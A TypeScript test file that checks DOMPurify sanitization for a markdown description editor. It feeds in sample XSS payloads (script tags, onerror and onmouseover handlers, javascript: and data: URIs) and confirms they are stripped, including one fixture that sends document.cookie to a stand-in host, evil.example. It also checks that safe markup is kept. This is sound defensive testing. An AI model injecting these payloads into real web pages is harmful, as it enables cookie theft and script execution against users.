/**
 * XSS fixture tests for markdown description sanitization.
 *
 * DescriptionEditor uses DOMPurify.sanitize() on all content before handing
 * it to TipTap (which also runs with html:false). These tests verify that
 * the sanitization layer alone strips dangerous payloads and preserves safe
 * markdown-generated HTML.
 *
 * DOMPurify requires a real DOM implementation. We construct one via jsdom
 * and pass its window to DOMPurify(window), which is the same pattern used
 * at runtime in the browser (DOMPurify auto-detects window there).
 */
import { describe, it, expect, beforeAll } from 'vitest'
import { JSDOM } from 'jsdom'
import DOMPurify from 'dompurify'

let purify: ReturnType<typeof DOMPurify>

beforeAll(() => {
  const { window } = new JSDOM('')
  purify = DOMPurify(window as unknown as Window & typeof globalThis)
})

// ── XSS payloads ─────────────────────────────────────────────────────────────

describe('DOMPurify strips XSS payloads from description content', () => {
  const xssFixtures: Array<{ label: string; payload: string; banned: string[] }> = [
    {
      label: 'inline <script> tag',
      payload: '<script>alert(1)</script>',
      banned: ['<script>', 'alert'],
    },
    {
      label: '<img> with onerror handler',
      payload: '<img onerror="alert(1)" src="x">',
      banned: ['onerror'],
    },
    {
      label: '<a> with javascript: href',
      payload: '<a href="javascript:void(0)">click me</a>',
      banned: ['javascript:'],
    },
    {
      label: '<style> block',
      payload: '<style>body { display: none }</style>',
      banned: ['<style>'],
    },
    {
      label: 'onmouseover event handler',
      payload: '<div onmouseover="fetch(\'https://evil.example/c?\'+document.cookie)">hover</div>',
      banned: ['onmouseover'],
    },
    {
      label: 'data: URI in img src',
      payload: '<img src="data:text/html,<script>alert(1)</script>">',
      banned: ['data:text/html'],
    },
    {
      label: 'SVG with embedded script',
      payload: '<svg><script>alert(1)</script></svg>',
      banned: ['<script>'],
    },
  ]

  xssFixtures.forEach(({ label, payload, banned }) => {
    it(`strips ${label}`, () => {
      const sanitized = purify.sanitize(payload)
      for (const forbidden of banned) {
        expect(sanitized, `expected "${forbidden}" to be absent after sanitizing: ${payload}`)
          .not.toContain(forbidden)
      }
    })
  })
})

// ── Safe markdown HTML is preserved ─────────────────────────────────────────

describe('DOMPurify preserves safe markdown-generated HTML', () => {
  it('keeps <strong> and <em> tags', () => {
    const safe = '<p><strong>bold</strong> and <em>italic</em></p>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('strong')
    expect(sanitized).toContain('em')
    expect(sanitized).toContain('bold')
    expect(sanitized).toContain('italic')
  })

  it('keeps <code> and <pre> blocks', () => {
    const safe = '<pre><code class="language-ts">const x = 1</code></pre>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('code')
    expect(sanitized).toContain('const x = 1')
  })

  it('keeps <ul> / <ol> / <li> lists', () => {
    const safe = '<ul><li>item one</li><li>item two</li></ul>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('ul')
    expect(sanitized).toContain('li')
    expect(sanitized).toContain('item one')
  })

  it('keeps headings h1–h6', () => {
    const safe = '<h1>Title</h1><h2>Sub</h2>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('h1')
    expect(sanitized).toContain('h2')
    expect(sanitized).toContain('Title')
  })

  it('keeps <blockquote>', () => {
    const safe = '<blockquote><p>A quote.</p></blockquote>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('blockquote')
    expect(sanitized).toContain('A quote.')
  })

  it('keeps safe <a> tags with http href', () => {
    const safe = '<a href="https://example.com">link</a>'
    const sanitized = purify.sanitize(safe)
    expect(sanitized).toContain('href')
    expect(sanitized).toContain('https://example.com')
  })

  it('returns empty string for empty input (no crash)', () => {
    expect(purify.sanitize('')).toBe('')
  })

  it('is idempotent — sanitizing already-clean output yields same result', () => {
    const safe = '<p><strong>hello</strong></p>'
    const once = purify.sanitize(safe)
    const twice = purify.sanitize(once)
    expect(twice).toBe(once)
  })
})
